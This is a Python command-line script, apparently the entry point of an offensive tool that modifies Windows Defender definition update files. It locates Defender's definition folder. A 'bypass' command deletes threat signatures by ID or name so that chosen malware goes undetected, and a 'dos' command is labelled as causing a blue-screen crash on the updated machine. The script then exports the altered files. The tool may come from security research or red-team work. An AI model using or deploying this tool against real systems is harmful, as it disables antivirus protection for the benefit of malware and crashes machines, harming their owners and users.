import re
import os
import glob
import logging
import argparse

from core.utils import version_banner
from core.utils.logger import init_logger
from core.definition_update import DefinitionUpdate

def get_defualt_definition_update_path() -> str:
    defualt_path = r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates"
    
    for items in os.walk(defualt_path):    
        if re.search(r'\{[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}\}', items[0]):
            return items[0]
    return None          

def handle_delete_command(args, definition_update: DefinitionUpdate):
    if args.id:
        definition_update.delete_threat_by_id(args.id)
    elif args.name:
        match_bytes = args.name.encode()
        definition_update.delete_match_threat_name(match_bytes)    
        
    definition_update.export()

def handle_do_dos(args, definition_update: DefinitionUpdate):
    definition_update.do_dos()
    definition_update.export()

def router(args, definition_update: DefinitionUpdate):
    if args.command == 'bypass':
        handle_delete_command(args, definition_update)
    elif args.command == 'dos':
        handle_do_dos(args, definition_update)
    else:
        logging.error(f"Unrecognized command: {args.command}")
        pass

def main():
    init_logger()
    print(version_banner())

    options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
    options.add_argument('--output', default='.', help='output folder for the exported vdm files')
    subparsers = options.add_subparsers(dest='command', required=True)

    bypass_subparser = subparsers.add_parser('bypass', help='bypass windows defender threats')
    bypass_group = bypass_subparser.add_mutually_exclusive_group()
    bypass_group.add_argument('-name', help="delete all threats that his name containes <name>")
    bypass_group.add_argument('-id', help="delete threat by his id")

    subparsers.add_parser('dos', help='causing a BSOD to the updated machine')

    args = options.parse_args()

    defination_update_path = get_defualt_definition_update_path()
    output_path = args.output

    definition_update = DefinitionUpdate(defination_update_path)
    definition_update.set_output_path(output_path)

    router(args, definition_update)


if __name__ == "__main__":
    main()